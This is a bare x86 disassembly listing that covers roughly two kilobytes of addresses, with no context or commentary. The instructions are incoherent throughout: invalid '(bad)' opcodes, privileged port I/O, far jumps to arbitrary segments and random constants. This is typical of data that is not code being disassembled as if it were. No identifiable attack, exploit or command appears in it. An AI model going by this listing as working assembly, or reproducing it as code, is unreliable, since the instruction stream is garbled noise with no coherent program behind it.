  412b05:	add    BYTE PTR [eax],al
  412b07:	mov    ecx,DWORD PTR [ebx+eax*1]
  412b0a:	add    BYTE PTR [eax],al
  412b0c:	loop   0x412ad9
  412b0e:	xor    al,0x0
  412b11:	add    BYTE PTR [edi+0x109eeea7],dl
  412b17:	jnp    0x412b13
  412b19:	mov    esp,0xea573d61
  412b1e:	sbb    BYTE PTR [ecx],ch
  412b20:	push   eax
  412b21:	mov    BYTE PTR [edx-0x6e030000],dl
  412b27:	inc    esi
  412b28:	popa   
  412b29:	test   BYTE PTR [esi+0x0],cl
  412b2c:	add    BYTE PTR [ebx+edx*2+0x42a0d7ac],bh
  412b33:	jbe    0x412b39
  412b35:	jp     0x412b37
  412b37:	add    BYTE PTR ds:0x7e753c9f,cl
  412b3d:	fwait
  412b3e:	pop    esi
  412b3f:	gs push esi
  412b41:	push   ebp
  412b42:	ret    
  412b43:	jge    0x412b29
  412b45:	in     eax,0x96
  412b47:	gs hlt 
  412b49:	out    dx,al
  412b4a:	mov    ebp,DWORD PTR ds:0x1af66a02
  412b50:	ficomp DWORD PTR [ecx-0x39fb019a]
  412b56:	add    BYTE PTR [eax],al
  412b58:	into   
  412b59:	jnp    0x412b06
  412b5b:	adc    ch,bl
  412b5d:	jns    0x412b0f
  412b5f:	inc    esp
  412b60:	mov    ebx,0xbdfc0000
  412b65:	xor    ecx,ecx
  412b67:	push   esp
  412b68:	add    eax,0x5d1ebdf1
  412b6d:	or     al,ch
  412b6f:	add    BYTE PTR [eax],al
  412b71:	xchg   edx,eax
  412b72:	ja     0x412b73
  412b74:	popf   
  412b75:	fs aad 0xc7
  412b78:	jnp    0x412bc9
  412b7a:	iret   
  412b7b:	mov    eax,0xbe79aba2
  412b80:	jge    0xef0ebcb5
  412b86:	test   ebx,esp
  412b88:	or     bl,BYTE PTR [ecx-0x57ae109]
  412b8e:	inc    edi
  412b8f:	inc    esi
  412b90:	push   esi
  412b91:	in     eax,dx
  412b92:	or     BYTE PTR [ebx+0x0],dl
  412b95:	add    BYTE PTR [ebp+0x261b571c],bl
  412b9b:	inc    esp
  412b9c:	push   ss
  412b9d:	add    BYTE PTR [eax],al
  412b9f:	mov    bh,0xac
  412ba1:	call   0x5992:0x19fb3062
  412ba8:	es push eax
  412baa:	xchg   ecx,eax
  412bab:	mov    fs,WORD PTR [bx+si-0xd9d]
  412bb0:	xchg   DWORD PTR [ecx+0x41],ebx
  412bb3:	inc    ebx
  412bb4:	add    al,0x9c
  412bb6:	add    BYTE PTR [eax],al
  412bb8:	xchg   edi,eax
  412bb9:	sub    cl,BYTE PTR [ecx]
  412bbb:	mov    eax,0x51226398
  412bc0:	(bad)  
  412bc1:	mov    bl,0x7c
  412bc3:	xor    al,dl
  412bc5:	arpl   WORD PTR [eax-0x1b],dx
  412bc8:	imul   eax,DWORD PTR [edi+0x44],0x2b
  412bcc:	add    BYTE PTR [eax],al
  412bce:	mov    edi,0xbcca103a
  412bd3:	in     eax,0x88
  412bd5:	xor    eax,DWORD PTR [eax]
  412bd7:	add    al,dh
  412bd9:	mov    al,ds:0xe158164a
  412bde:	lahf   
  412bdf:	xchg   ecx,eax
  412be0:	xchg   edi,eax
  412be1:	sti    
  412be2:	push   eax
  412be3:	push   ss
  412be4:	mov    bh,0x13
  412be6:	sub    al,BYTE PTR [esi+ebp*4+0x0]
  412bea:	add    BYTE PTR [eax+0x1a0000ff],cl
  412bf0:	xchg   edx,eax
  412bf1:	mov    BYTE PTR [edx+0x4d5c0000],cl
  412bf7:	jno    0x412b91
  412bf9:	xchg   esp,esi
  412bfb:	cmp    al,0xaf
  412bfd:	push   ecx
  412bfe:	mov    ebx,0xfba29f6
  412c03:	adc    DWORD PTR [edi+0x7c],0xffffffde
  412c07:	or     BYTE PTR [edx],dh
  412c09:	add    BYTE PTR [eax],al
  412c0b:	stc    
  412c0c:	mov    bl,0x9f
  412c0e:	das    
  412c0f:	push   edi
  412c10:	out    dx,al
  412c11:	mov    ch,0x67
  412c13:	rol    BYTE PTR [esi],1
  412c15:	xchg   ebx,eax
  412c16:	mov    esp,0x864c5b
  412c1b:	add    BYTE PTR [ecx],bh
  412c1d:	fisubr WORD PTR [ebp-0x582cc5e0]
  412c23:	xor    DWORD PTR [edx],ebx
  412c25:	cmc    
  412c26:	mov    WORD PTR [edi+0x0],ss
  412c29:	add    dh,al
  412c2b:	ss nop
  412c2d:	adc    edx,edx
  412c2f:	pop    edi
  412c30:	es (bad) 
  412c32:	enter  0xee,0x0
  412c36:	inc    esp
  412c37:	rol    DWORD PTR [eax],1
  412c39:	add    ah,ch
  412c3b:	and    al,0x8a
  412c3d:	jge    0x412c6e
  412c3f:	push   ss
  412c40:	jbe    0x412be8
  412c42:	loope  0x412c88
  412c44:	sub    eax,DWORD PTR [eax]
  412c46:	add    BYTE PTR [ebx+ebp*1],dl
  412c49:	xor    cl,BYTE PTR [ebx+0x54049f]
  412c4f:	add    BYTE PTR [edx-0x38e957c9],ch
  412c55:	mov    esi,0xe0639e7d
  412c5a:	ja     0x412c4f
  412c5c:	sbb    eax,0xd64ac223
  412c61:	jmp    0x0:0x4384d6f8
  412c68:	test   BYTE PTR [ebx],bh
  412c6a:	add    BYTE PTR [eax],al
  412c6c:	pop    esi
  412c6d:	adc    al,0x2b
  412c6f:	sub    eax,0x6c48
  412c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c75:	mov    eax,0x79b02eeb
  412c7a:	enter  0xca,0x0
  412c7e:	xor    dh,cl
  412c80:	mov    cl,0xba
  412c82:	dec    ecx
  412c83:	fsub   QWORD PTR [edi-0x765ca545]
  412c89:	push   esp
  412c8a:	or     eax,0x740a3956
  412c8f:	outs   dx,BYTE PTR ds:[esi]
  412c90:	clc    
  412c91:	enter  0x43,0x0
  412c95:	sub    DWORD PTR ds:0x12d91b96,eax
  412c9b:	push   edx
  412c9c:	push   0xffffffaf
  412c9e:	jb     0x412cec
  412ca0:	rol    BYTE PTR [eax],0x0
  412ca3:	add    BYTE PTR [ebx+0x0],0x0
  412ca7:	popa   
  412ca8:	pop    ss
  412ca9:	add    al,0xc3
  412cab:	add    BYTE PTR [eax],al
  412cad:	mov    BYTE PTR [edi-0x301a0000],al
  412cb3:	xor    eax,0xb6e2b124
  412cb8:	nop
  412cb9:	les    ecx,FWORD PTR [esi+0x4c340000]
  412cbf:	push   es
  412cc0:	add    BYTE PTR [eax],al
  412cc2:	retf   0x3eb7
  412cc5:	adc    BYTE PTR [esi-0x5e469c5c],ch
  412ccb:	adc    al,0x3f
  412ccd:	push   eax
  412cce:	push   esp
  412ccf:	dec    DWORD PTR [edi]
  412cd1:	mov    eax,DWORD PTR ds:0x195217e3
  412cd7:	fnstcw WORD PTR [ecx-0x25]
  412cda:	pop    esp
  412cdb:	fstp   DWORD PTR [edx-0x2c931162]
  412ce1:	(bad)  
  412ce2:	mov    eax,ds:0xede6f2a1
  412ce7:	fst    DWORD PTR [esi+0x58]
  412cea:	test   dl,ah
  412cec:	add    BYTE PTR [eax],al
  412cee:	xor    al,0x43
  412cf0:	rcr    DWORD PTR [eax-0x39],0x3a
  412cf4:	(bad)  
  412cf5:	and    eax,0x4b0ec69e
  412cfa:	fsubr  DWORD PTR [eax-0x32]
  412cfd:	sub    al,0x9a
  412cff:	lds    edx,FWORD PTR [eax+ebp*4-0x444fd964]
  412d06:	pushf  
  412d07:	add    eax,0x584b3407
  412d0c:	mov    eax,ds:0xfe6324d6
  412d11:	jecxz  0x412d01
  412d13:	jnp    0x412d15
  412d15:	retf   0x0
  412d18:	add    cl,BYTE PTR es:[ebx-0x14]
  412d1c:	adc    edi,DWORD PTR [edi]
  412d1e:	push   edx
  412d1f:	sbb    eax,0x7913b63d
  412d24:	mov    ah,0x2c
  412d26:	xor    DWORD PTR [edx+ecx*1+0x34],esp
  412d2a:	cmp    al,0x86
  412d2c:	add    BYTE PTR [eax-0x69810000],dh
  412d32:	dec    ecx
  412d33:	sub    al,0x24
  412d35:	push   ss
  412d36:	push   ds
  412d37:	retf   
  412d38:	arpl   WORD PTR [bp+si-0x6b],bx
  412d3c:	(bad)  
  412d3d:	into   
  412d3e:	add    BYTE PTR [eax],al
  412d40:	cld    
  412d41:	(bad)  
  412d43:	std    
  412d44:	or     dl,bh
  412d46:	add    BYTE PTR [eax],al
  412d48:	xor    eax,0xa9125c55
  412d4d:	pop    ds
  412d4e:	dec    esi
  412d4f:	mov    WORD PTR [edi+0x0],?
  412d52:	add    BYTE PTR [ebp+0x53],bh
  412d55:	add    BYTE PTR [eax+eax*1+0x0],cl
  412d59:	mov    bh,BYTE PTR [ebx-0x14]
  412d5c:	dec    ecx
  412d5d:	in     al,0x78
  412d5f:	pusha  
  412d60:	ja     0x412d61
  412d62:	dec    edx
  412d63:	push   esi
  412d64:	stc    
  412d65:	adc    dl,BYTE PTR [ebx-0xfeee893]
  412d6b:	lods   eax,DWORD PTR ds:[esi]
  412d6c:	add    ebx,DWORD PTR [ebx]
  412d6e:	add    dl,dh
  412d70:	fild   DWORD PTR [eax]
  412d72:	add    BYTE PTR es:[eax],al
  412d75:	stos   DWORD PTR es:[edi],eax
  412d76:	dec    esi
  412d77:	lds    dx,DWORD PTR [ecx-0x20]
  412d7b:	lods   eax,DWORD PTR ds:[esi]
  412d7c:	inc    edx
  412d7d:	mov    edx,0xbd14b7d6
  412d82:	sub    dh,0x0
  412d85:	add    ch,ah
  412d87:	fsub   QWORD PTR [edi+0x264d1014]
  412d8d:	xchg   edi,eax
  412d8e:	xchg   ecx,eax
  412d8f:	gs mov eax,0xd0d8ee1e
  412d95:	ss jg  0x412d7e
  412d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d99:	and    cl,BYTE PTR [esi+0x5e]
  412d9c:	mov    ds:0xbc7c2732,al
  412da1:	rcl    DWORD PTR [ecx+edx*2],1
  412da4:	setg   BYTE PTR [esi+0x524d4930]
  412dab:	(bad)  
  412dac:	xor    BYTE PTR [esi],bh
  412dae:	xor    al,BYTE PTR [esi+edx*4-0x39d10000]
  412db5:	jg     0x412d51
  412db7:	ins    BYTE PTR es:[edi],dx
  412db8:	mov    al,ds:0x5710ffd8
  412dbd:	sti    
  412dbe:	sub    eax,0x32c7596e
  412dc3:	rep stos DWORD PTR es:[edi],eax
  412dc5:	ins    DWORD PTR es:[edi],dx
  412dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc7:	mov    esp,0x3355ce5f
  412dcc:	xchg   ebp,eax
  412dcd:	xlat   BYTE PTR ds:[ebx]
  412dce:	add    eax,0x1d7f6e20
  412dd3:	jae    0x412dc2
  412dd5:	pop    ebp
  412dd6:	push   ecx
  412dd7:	cwde   
  412dd8:	or     BYTE PTR [eax],bl
  412dda:	add    BYTE PTR [eax],al
  412ddc:	ins    DWORD PTR es:[edi],dx
  412ddd:	mov    esi,0xad7c7bb2
  412de2:	out    0x21,al
  412de4:	mov    bh,dh
  412de6:	add    BYTE PTR [eax],al
  412de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412de9:	(bad)  
  412dea:	(bad)  
  412deb:	mov    cl,0x38
  412ded:	jp     0x412d76
  412def:	or     DWORD PTR [esi-0x5d],ecx
  412df2:	data16 jp 0x412d7e
  412df5:	std    
  412df6:	sub    cl,BYTE PTR [ebp+0x61]
  412df9:	rol    BYTE PTR [ecx],1
  412dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dfc:	(bad)  
  412dfd:	cwde   
  412dfe:	outs   dx,DWORD PTR ds:[esi]
  412dff:	pop    edx
  412e00:	mov    ch,0x9a
  412e02:	das    
  412e03:	sbb    ebx,esi
  412e05:	ins    BYTE PTR es:[edi],dx
  412e06:	jbe    0x412e02
  412e08:	out    dx,al
  412e09:	cmp    dh,cl
  412e0b:	ja     0x412dd4
  412e0d:	pop    ecx
  412e0e:	(bad)  
  412e0f:	retf   
  412e10:	add    BYTE PTR [eax],al
  412e12:	cs mov ebp,0x740d7d10
  412e18:	shl    DWORD PTR [edx-0x5b],0xa2
  412e1c:	xchg   esi,eax
  412e1d:	daa    
  412e1e:	xor    esp,ecx
  412e20:	pop    esp
  412e21:	cmp    dh,BYTE PTR [ebx+0x1d]
  412e24:	(bad)  
  412e26:	adc    eax,0x46cda156
  412e2b:	sub    BYTE PTR [ebp+0x6f6a365a],dh
  412e31:	xor    eax,DWORD PTR [ecx]
  412e33:	pop    esp
  412e34:	mov    ch,0x4f
  412e36:	adc    dl,al
  412e38:	rcr    DWORD PTR [edi],cl
  412e3a:	push   ebp
  412e3b:	xchg   esp,eax
  412e3c:	push   esi
  412e3d:	retf   0x1a89
  412e40:	lods   eax,DWORD PTR fs:[esi]
  412e42:	adc    cl,BYTE PTR [edx+ecx*4]
  412e45:	add    BYTE PTR [eax],al
  412e47:	xor    ecx,0xd5b9d94e
  412e4d:	aaa    
  412e4e:	fidivr DWORD PTR [esi]
  412e50:	dec    eax
  412e51:	push   ds
  412e52:	add    BYTE PTR [eax],al
  412e54:	jg     0x412ebe
  412e56:	(bad)  
  412e57:	cwde   
  412e58:	retf   0x6c34
  412e5b:	call   0xb2c15b1a
  412e60:	add    BYTE PTR [eax],al
  412e62:	aam    0x54
  412e64:	(bad)  
  412e65:	xlat   BYTE PTR ds:[ebx]
  412e66:	adc    edi,eax
  412e68:	rol    DWORD PTR [edx],0x8a
  412e6b:	xchg   dh,bh
  412e6d:	push   cs
  412e6e:	cli    
  412e6f:	jne    0x412e4c
  412e71:	mov    ecx,0xcd46eceb
  412e76:	sbb    dl,BYTE PTR [edi+0x21]
  412e79:	(bad)  
  412e7a:	(bad)  
  412e7b:	(bad)  
  412e7c:	cmc    
  412e7d:	not    edi
  412e7f:	(bad)  
  412e80:	in     al,0x87
  412e82:	jae    0x412e2c
  412e84:	sbb    BYTE PTR [ebp-0x72c0a5c8],bh
  412e8a:	cmp    ecx,edx
  412e8c:	call   0x2d86:0xb61a3d7a
  412e93:	test   DWORD PTR [ebx+eiz*1-0x19250000],ecx
  412e9a:	out    dx,eax
  412e9b:	loope  0x412f0a
  412e9d:	adc    bh,BYTE PTR [edi-0x55]
  412ea0:	push   es
  412ea1:	pushf  
  412ea2:	xchg   ebx,eax
  412ea3:	xchg   esi,eax
  412ea4:	dec    ebx
  412ea5:	cmp    eax,0x75fbffa1
  412eaa:	outs   dx,BYTE PTR ds:[esi]
  412eab:	int    0xe7
  412ead:	sti    
  412eae:	add    eax,0xa33f5fe8
  412eb3:	sbb    DWORD PTR [eax],edx
  412eb5:	pop    ss
  412eb6:	test   eax,0xae48
  412ebb:	mov    ds:0xe925ff8b,al
  412ec0:	outs   dx,DWORD PTR ds:[esi]
  412ec1:	mov    al,0xba
  412ec3:	jnp    0x412eb7
  412ec5:	mov    bh,0x2a
  412ec7:	push   ds
  412ec8:	xor    eax,0x1993bc72
  412ecd:	jecxz  0x412e89
  412ecf:	lahf   
  412ed0:	lahf   
  412ed1:	lahf   
  412ed2:	sbb    DWORD PTR [eax-0x50],eax
  412ed5:	add    BYTE PTR [eax],al
  412ed7:	aaa    
  412ed8:	out    dx,al
  412ed9:	and    ecx,DWORD PTR [ecx+0x73]
  412edc:	neg    dh
  412ede:	sbb    BYTE PTR ds:0xbf4482,0x0
  412ee5:	test   al,0x34
  412ee7:	outs   dx,BYTE PTR ds:[esi]
  412ee8:	add    dh,BYTE PTR [ebx*1-0x11d8fed0]
  412eef:	mov    ebx,0x51e316a1
  412ef4:	xchg   esp,eax
  412ef5:	aad    0xb0
  412ef7:	jle    0x412f11
  412ef9:	sti    
  412efa:	mov    ah,0xc0
  412efc:	stos   DWORD PTR es:[edi],eax
  412efd:	add    BYTE PTR [eax],al
  412eff:	sbb    al,0xa3
  412f01:	adc    DWORD PTR [edi+0x17d6b2f4],0xffffff8e
  412f08:	pop    edx
  412f09:	jecxz  0x412f53
  412f0b:	mov    eax,0x9f280000
  412f10:	xchg   esp,eax
  412f11:	dec    esi
  412f12:	ficomp WORD PTR [ecx*1-0x30dab18a]
  412f19:	jge    0x412eae
  412f1b:	mov    esi,esi
  412f1d:	repz push ss
  412f1f:	stos   DWORD PTR es:[edi],eax
  412f20:	jl     0x412f8d
  412f22:	into   
  412f23:	ins    BYTE PTR es:[edi],dx
  412f24:	xlat   BYTE PTR ds:[ebx]
  412f25:	(bad)  
  412f26:	cmc    
  412f27:	(bad)  
  412f28:	in     al,dx
  412f29:	pop    es
  412f2a:	shl    BYTE PTR [ebp-0x37d823a3],cl
  412f30:	lods   eax,DWORD PTR ds:[esi]
  412f31:	add    BYTE PTR [eax],al
  412f33:	sub    esp,DWORD PTR [ecx+0x239f799]
  412f39:	fisttp WORD PTR [esi-0x4b]
  412f3d:	daa    
  412f3e:	jns    0x412f2d
  412f40:	mov    esi,0x26407557
  412f45:	add    BYTE PTR [eax],al
  412f47:	outs   dx,BYTE PTR ds:[esi]
  412f48:	iret   
  412f49:	inc    esi
  412f4a:	xchg   BYTE PTR [eax+ebx*1],cl
  412f4d:	add    BYTE PTR [eax],al
  412f4f:	mov    edi,0x5f56a0d9
  412f54:	sub    BYTE PTR [eax],ah
  412f56:	mov    ah,0xc6
  412f58:	add    cl,BYTE PTR [ebp+0x76]
  412f5b:	pushf  
  412f5c:	jns    0x412f10
  412f5e:	popa   
  412f5f:	in     al,0x25
  412f61:	call   0x3e6074ff
  412f66:	sahf   
  412f67:	popa   
  412f68:	fstp   DWORD PTR ds:[eax+0x12d56f69]
  412f6f:	add    al,0x8e
  412f71:	add    BYTE PTR [eax],al
  412f73:	and    BYTE PTR [edi-0x33],dl
  412f76:	and    BYTE PTR [ebp-0x20],cl
  412f79:	imul   ecx,DWORD PTR [edi],0xd273fd43
  412f7f:	jnp    0x412f06
  412f81:	inc    esp
  412f82:	cmc    
  412f83:	add    BYTE PTR [eax],al
  412f85:	or     edi,DWORD PTR [esi]
  412f87:	sbb    BYTE PTR [ebp-0xd79965b],bh
  412f8d:	pop    ds
  412f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f8f:	std    
  412f90:	add    eax,0x47971afb
  412f95:	jmp    0x41ac62
  412f9a:	push   cs
  412f9b:	dec    edi
  412f9c:	sahf   
  412f9d:	aam    0x83
  412f9f:	jge    0x412f36
  412fa1:	mov    edi,0x1fe6d57e
  412fa6:	retf   0x646c
  412fa9:	sub    ebx,DWORD PTR [ebx-0x22]
  412fac:	cwde   
  412fad:	push   0xffffff92
  412faf:	or     BYTE PTR ds:0x152d0000,dh
  412fb5:	push   0xe70183bf
  412fba:	cmp    cl,BYTE PTR [edx+0x5e]
  412fbd:	sbb    DWORD PTR [edx-0x36],0x39e42e85
  412fc4:	jne    0x412fba
  412fc6:	inc    esp
  412fc7:	push   eax
  412fc8:	add    BYTE PTR [eax],al
  412fca:	jb     0x412fa6
  412fcc:	(bad)  
  412fcd:	imul   edx,DWORD PTR gs:[ecx-0x32],0xffffff8a
  412fd2:	in     eax,0x20
  412fd4:	sti    
  412fd5:	jno    0x412fd6
  412fd7:	lods   al,BYTE PTR ds:[esi]
  412fd8:	fadd   QWORD PTR [ecx+0x2904b4]
  412fde:	add    BYTE PTR [eax-0x3c],ah
  412fe1:	sldt   WORD PTR [eax]
  412fe4:	xchg   edi,eax
  412fe5:	aas    
  412fe6:	xor    BYTE PTR [edx+0x4844ac],cl
  412fec:	add    BYTE PTR [ecx+0x3ea69bc9],bh
  412ff2:	inc    edi
  412ff3:	leave  
  412ff4:	mov    edi,0xe07af1fe
  412ff9:	jnp    0x413039
  412ffb:	jmp    0xec2de529
  413000:	pop    ebp
  413001:	(bad)  
  413002:	das    
  413003:	sub    eax,0xb1bf3f05
  413008:	clc    
  413009:	es dec eax
  41300b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41300c:	add    BYTE PTR [eax],al
  41300e:	xor    eax,0x939954d9
  413013:	retf   0x6ab4
  413016:	pop    edx
  413017:	repz shl BYTE PTR [edi+esi*8+0x26],1
  41301c:	inc    ebp
  41301d:	pop    ebp
  41301e:	adc    ch,dh
  413020:	push   eax
  413021:	adc    al,0x3d
  413023:	popa   
  413024:	mov    ds:0xa7403a,al
  413029:	add    bl,ch
  41302b:	or     BYTE PTR [eax+eax*1+0x0],dl
  41302f:	xor    edx,DWORD PTR [ebx]
  413031:	mov    eax,ds:0xf2876a9f
  413036:	pushf  
  413037:	push   edi
  413038:	icebp  
  413039:	adc    al,0xb7
  41303b:	addr16 daa 
  41303d:	xchg   esp,eax
  41303e:	push   0xffffffea
  413040:	mov    ebp,0xa740
  413045:	sbb    DWORD PTR [edx-0x73],ebx
  413048:	xchg   ebx,eax
  413049:	ss adc edx,eax
  41304c:	in     al,dx
  41304d:	ret    
  41304e:	addr16 push ss
  413050:	add    edx,0xc9bb995d
  413056:	lahf   
  413057:	loopne 0x41303c
  413059:	les    ecx,FWORD PTR [ecx+0x0]
  41305c:	add    BYTE PTR [edx],bl
  41305e:	iret   
  41305f:	xchg   BYTE PTR [ecx-0x1d],bl
  413062:	mov    esp,0x155dbb47
  413067:	out    dx,al
  413068:	shl    edi,0x3b
  41306b:	mov    ds:0xc584,eax
  413070:	jg     0x413042
  413072:	mov    ds:0x8f8069ef,eax
  413077:	add    BYTE PTR [eax],al
  413079:	dec    edi
  41307a:	sub    ebx,DWORD PTR [ebp+0xc]
  41307d:	xchg   ebp,eax
  41307e:	add    BYTE PTR [eax],al
  413080:	aaa    
  413081:	(bad)  [ecx+0x1]
  413084:	jg     0x4130f5
  413086:	shl    DWORD PTR [eax+0xd2a9acb],0x4a
  41308d:	jae    0x4130b1
  41308f:	psllq  mm2,QWORD PTR [edx-0x6c]
  413093:	cmp    al,0x6
  413095:	out    0xd6,eax
  413097:	fmul   st(4),st
  413099:	(bad)  
  41309a:	add    BYTE PTR [eax],al
  41309c:	dec    ebp
  41309d:	jge    0x413100
  41309f:	jmp    0x413032
  4130a1:	cmp    ebx,ecx
  4130a3:	sbb    edi,ecx
  4130a5:	dec    edx
  4130a6:	jne    0x413110
  4130a8:	ret    
  4130a9:	mov    gs,WORD PTR [ecx]
  4130ab:	lea    ebp,[ebx-0x4cfe7a20]
  4130b1:	imul   ebp,DWORD PTR [eax-0x3a],0x7a36faff
  4130b8:	xchg   esi,eax
  4130b9:	jbe    0x41304e
  4130bb:	test   eax,0x9df0185d
  4130c0:	stc    
  4130c1:	mov    dh,0x3f
  4130c3:	in     eax,dx
  4130c4:	(bad)  
  4130c5:	fstp   DWORD PTR [eax]
  4130c7:	adc    eax,0xbb98fa10
  4130cc:	jl     0x41307c
  4130ce:	or     dh,al
  4130d0:	sub    al,0xb8
  4130d2:	icebp  
  4130d3:	xchg   ebx,edx
  4130d5:	jecxz  0x4130e3
  4130d7:	dec    esp
  4130d8:	add    BYTE PTR [eax],al
  4130da:	push   esi
  4130db:	in     al,dx
  4130dc:	js     0x4130b6
  4130de:	mov    al,0x28
  4130e0:	loop   0x41307f
  4130e2:	int3   
  4130e3:	les    eax,FWORD PTR [eax]
  4130e5:	add    BYTE PTR [edx],ch
  4130e7:	inc    ebx
  4130e8:	lods   al,BYTE PTR ds:[esi]
  4130e9:	xchg   edi,eax
  4130ea:	mov    ebp,0xedfc4358
  4130ef:	xchg   edx,eax
  4130f0:	and    BYTE PTR ds:[eax-0x2d],dl
  4130f4:	int3   
  4130f5:	bound  eax,QWORD PTR [eax]
  4130f7:	add    BYTE PTR [ebx],dh
  4130f9:	out    dx,eax
  4130fa:	loopne 0x4130c3
  4130fc:	sbb    edi,DWORD PTR [ebp-0x4f]
  4130ff:	cmp    al,0xe
  413101:	icebp  
  413102:	sbb    BYTE PTR [eax+0xd24433],bl
  413108:	add    bl,bh
  41310a:	mov    eax,ds:0x6cd3ac77
  41310f:	mov    ds:0x94024e15,al
  413114:	repz cdq 
  413116:	sbb    DWORD PTR [ebx+0x67],0x623e245d
  41311d:	xor    esi,DWORD PTR [eax-0x55]
  413120:	shl    DWORD PTR [ebx],1
  413122:	xor    BYTE PTR ds:[edi],0x0
  413126:	add    ch,ch
  413128:	stos   BYTE PTR es:[edi],al
  413129:	push   ecx
  41312a:	aaa    
  41312b:	sub    BYTE PTR [edx-0x5f4647b7],bl
  413131:	mov    ebx,0xe41b3edb
  413136:	pusha  
  413137:	sbb    BYTE PTR [ebx+0x353ab2b2],dh
  41313d:	mov    edx,0x21369675
  413142:	sbb    dh,0x0
  413145:	add    BYTE PTR [edi-0x64],al
  413148:	adc    eax,eax
  41314a:	ret    0x0
  41314d:	(bad)  
  41314e:	jno    0x4131b7
  413150:	xlat   BYTE PTR ds:[ebx]
  413151:	adc    eax,DWORD PTR [eax]
  413153:	stc    
  413154:	add    BYTE PTR [eax],al
  413156:	arpl   ax,cx
  413158:	lods   al,BYTE PTR ds:[esi]
  413159:	add    BYTE PTR [eax],al
  41315b:	mov    DWORD PTR [ecx-0x47],eax
  41315e:	icebp  
  41315f:	fwait
  413160:	mov    es,WORD PTR [ebx-0x590e38f0]
  413166:	mov    DWORD PTR [ebx+0x2d],eax
  413169:	fcmovbe st,st(4)
  41316b:	scas   al,BYTE PTR es:[di]
  41316d:	cmp    eax,0xa54e5caf
  413172:	out    0x7d,al
  413174:	or     edx,DWORD PTR [ebp+0x21]
  413177:	sub    al,0xb3
  413179:	retf   
  41317a:	jmp    0xec5b:0x3f9c8e42
  413181:	cld    
  413182:	inc    edx
  413183:	aad    0xef
  413185:	jge    0x4131be
  413187:	and    DWORD PTR [esi-0x14],eax
  41318a:	scas   al,BYTE PTR es:[edi]
  41318b:	pop    eax
  41318c:	shr    BYTE PTR [ebx+eax*1+0x7e],1
  413190:	repz jmp 0x4131cf
  413193:	pop    eax
  413194:	sar    edx,1
  413196:	jmp    0xbfcd:0x3772afb1
  41319d:	add    al,0x1e
  41319f:	add    BYTE PTR [eax],al
  4131a1:	(bad)  
  4131a2:	into   
  4131a3:	out    0x2,eax
  4131a5:	xor    DWORD PTR [ebx],0x3ef6322a
  4131ab:	in     al,0x16
  4131ad:	(bad)  
  4131ae:	stos   DWORD PTR es:[edi],eax
  4131af:	sbb    ah,BYTE PTR [esi-0x5d12587d]
  4131b5:	sbb    al,0xcc
  4131b7:	ins    BYTE PTR es:[edi],dx
  4131b8:	add    BYTE PTR [eax],al
  4131ba:	dec    ecx
  4131bb:	js     0x4131ae
  4131bd:	std    
  4131be:	mov    esp,0xcc0cc5
  4131c3:	add    BYTE PTR [ebp+0x1dec2ca5],bl
  4131c9:	sbb    bl,BYTE PTR [edx-0x1]
  4131cc:	jge    0x41315e
  4131ce:	sub    al,0x28
  4131d0:	and    DWORD PTR [edi-0x14],ebp
  4131d3:	sbb    al,BYTE PTR [ebp+0x3f]
  4131d6:	std    
  4131d7:	jle    0x4131fd
  4131d9:	mov    dh,0xd2
  4131db:	fisub  DWORD PTR [esi-0x57]
  4131de:	push   edx
  4131df:	ja     0xa9b58a6f
  4131e5:	test   al,0x20
  4131e7:	mov    dl,0x1
  4131e9:	out    dx,eax
  4131ea:	addr16 ss sub ch,bl
  4131ee:	lods   eax,DWORD PTR ds:[esi]
  4131ef:	bound  esp,QWORD PTR [ecx]
  4131f1:	sub    eax,0xe866367
  4131f6:	mov    eax,0xa3af5c6d
  4131fb:	or     BYTE PTR [edx],bh
  4131fd:	add    BYTE PTR [eax],al
  4131ff:	imul   ebx,esp,0x7b
  413202:	addr16 mov eax,0xb03da857
  413208:	xor    BYTE PTR [ebp+0x335f75e6],0x32
  41320f:	cld    
  413210:	(bad)  
  413211:	int3   
  413212:	lds    eax,FWORD PTR [eax]
  413214:	add    ah,bh
  413216:	hlt    
  413217:	clc    
  413218:	pusha  
  413219:	sbb    BYTE PTR [eax-0x64],dl
  41321c:	repz push esi
  41321e:	or     edx,DWORD PTR [ebx+ebp*4+0x1df14f59]
  413225:	pop    es
  413226:	push   esi
  413227:	pop    ebx
  413228:	jle    0x4131ec
  41322a:	jl     0x413256
  41322c:	jl     0x413270
  41322e:	es mov ebp,0xf644b3
  413234:	add    BYTE PTR [edx+0x337198eb],ah
  41323a:	push   edx
  41323b:	mov    ebx,0xb3b58583
  413240:	push   ecx
  413241:	add    edx,DWORD PTR [esi]
  413243:	les    ebx,FWORD PTR [ecx+0x0]
  413246:	add    BYTE PTR [esi],dl
  413248:	out    dx,al
  413249:	sbb    DWORD PTR [edx+0x54c8],eax
  41324f:	sbb    eax,0xf41edc02
  413254:	dec    edx
  413255:	mov    eax,0x715143f6
  41325a:	fadd   DWORD PTR [eax+0x4]
  41325d:	add    BYTE PTR [eax],al
  41325f:	or     DWORD PTR [ebp+0x59f00d8e],eax
  413265:	add    eax,0x3a59a8f4
  41326a:	xor    dl,dl
  41326c:	retf   
  41326d:	pop    eax
  41326e:	je     0x41329a
  413270:	mov    al,ds:0xef88f8
  413275:	add    BYTE PTR [ebx],bl
  413277:	sbb    eax,0x902c7eb7
  41327c:	cli    
  41327d:	cmp    cl,BYTE PTR [esp+ecx*2]
  413280:	add    BYTE PTR [eax],al
  413282:	push   0x1ded0756
  413287:	push   ebx
  413288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413289:	mov    ds:0xdcc,eax
  41328e:	and    BYTE PTR [ebx],0x0
  413291:	add    BYTE PTR [ebx+0x21],bl
  413294:	call   0x4d7d:0x7bf3145c
  41329b:	stos   DWORD PTR es:[edi],eax
  41329c:	es ss out 0x1b,al
  4132a0:	int    0x9
  4132a2:	test   eax,0x4c58c798
  4132a7:	cmp    eax,0xbf630000
  4132ac:	mov    bl,0x9d
  4132ae:	dec    edx
  4132af:	inc    edi
  4132b0:	je     0x4132eb
  4132b2:	xor    BYTE PTR [ecx+0x3608f731],0x0
